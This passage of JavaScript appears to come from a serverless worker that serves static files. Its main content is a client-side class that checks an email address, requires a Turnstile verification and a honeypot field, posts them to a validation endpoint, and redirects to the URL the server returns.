            document.body.style.fontSize = Math.max(12, currentSize - 2) + 'px';
        });
        
        highContrastBtn.addEventListener('click', () => {
            const currentTheme = document.documentElement.getAttribute('data-theme');
            if (currentTheme === 'high-contrast') {
                this.setTheme('auto');
            } else {
                this.setTheme('high-contrast');
            }
        });
    }
    
    setupTurnstile() {
        // Wait for Turnstile to load
        const checkTurnstile = () => {
            if (window.turnstile) {
                this.turnstileWidget = window.turnstile.render('.cf-turnstile', {
                    sitekey: 'YOUR_TURNSTILE_SITE_KEY', // Replace with your site key
                    callback: (token) => {
                        this.onTurnstileSuccess(token);
                    },
                    'expired-callback': () => {
                        this.onTurnstileExpired();
                    }
                });
            } else {
                setTimeout(checkTurnstile, 100);
            }
        };
        checkTurnstile();
    }
    
    onTurnstileSuccess(token) {
        this.submitBtn.disabled = false;
        this.submitBtn.style.opacity = '1';
    }
    
    onTurnstileExpired() {
        this.submitBtn.disabled = true;
        this.submitBtn.style.opacity = '0.7';
        this.showMessage('Verification expired. Please try again.', 'error');
    }
    
    showHelpText() {
        const helpDiv = document.getElementById('emailHelp');
        helpDiv.textContent = this.helpText || 'Enter a valid email address to continue.';
        helpDiv.style.display = 'block';
    }
    
    hideHelpText() {
        const helpDiv = document.getElementById('emailHelp');
        helpDiv.style.display = 'none';
    }
    
    async handleSubmit(e) {
        e.preventDefault();
        
        const email = this.emailInput.value.trim();
        const honeypotField = document.getElementById('honeypotField').value;
        
        // Validate email format
        if (!this.isValidEmail(email)) {
            this.showError('Please enter a valid email address.');
            return;
        }
        
        // Check if Turnstile is completed
        if (!window.turnstile || !window.turnstile.getResponse()) {
            this.showError('Please complete the verification.');
            return;
        }
        
        this.setLoading(true);
        
        try {
            const response = await fetch('/api/validate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    turnstileToken: window.turnstile.getResponse(),
                    honeypotField: honeypotField
                })
            });
            
            const data = await response.json();
            
            if (data.success) {
                this.showMessage('Redirecting...', 'success');
                setTimeout(() => {
                    window.location.href = data.redirectUrl;
                }, 1000);
            } else {
                this.showError(data.message || 'Access denied.');
                // Reset Turnstile on error
                if (window.turnstile) {
                    window.turnstile.reset();
                }
                
                // Handle exponential backoff
                if (data.delay) {
                    setTimeout(() => {
                        this.submitBtn.disabled = false;
                    }, data.delay * 1000);
                }
            }
        } catch (error) {
            console.error('Error:', error);
            this.showError('An error occurred. Please try again.');
            // Reset Turnstile on error
            if (window.turnstile) {
                window.turnstile.reset();
            }
        } finally {
            this.setLoading(false);
        }
    }
    
    isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }
    
    showError(message) {
        this.emailInput.classList.add('error');
        this.showMessage(message, 'error');
        
        // Remove error class after animation
        setTimeout(() => {
            this.emailInput.classList.remove('error');
        }, 500);
    }
    
    clearError() {
        this.emailInput.classList.remove('error');
        this.hideMessage();
    }
    
    showMessage(message, type = 'success') {
        this.messageDiv.textContent = message;
        this.messageDiv.className = \`message \${type}\`;
        this.messageDiv.style.display = 'block';
        
        // Auto-hide success messages
        if (type === 'success') {
            setTimeout(() => {
                this.hideMessage();
            }, 3000);
        }
    }
    
    hideMessage() {
        this.messageDiv.style.display = 'none';
    }
    
    setLoading(loading) {
        const btnText = this.submitBtn.querySelector('.btn-text');
        const btnLoading = this.submitBtn.querySelector('.btn-loading');
        
        if (loading) {
            btnText.style.display = 'none';
            btnLoading.style.display = 'inline';
            this.submitBtn.disabled = true;
        } else {
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
            this.submitBtn.disabled = false;
        }
    }
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new SecureRedirectApp();
});`
  };

  const content = files[filename];
  if (!content) {
    return new Response('File not found', { status: 404 });
  }

  const contentType = filename.endsWith('.html') ? 'text/html' :
                     filename.endsWith('.css') ? 'text/css' :
                     filename.endsWith('.js') ? 'application/javascript' : 'text/plain';

  return new Response(content, {
    headers: {
      'Content-Type': contentType,
      'Cache-Control': 'public, max-age=3600',
    },
  });
} 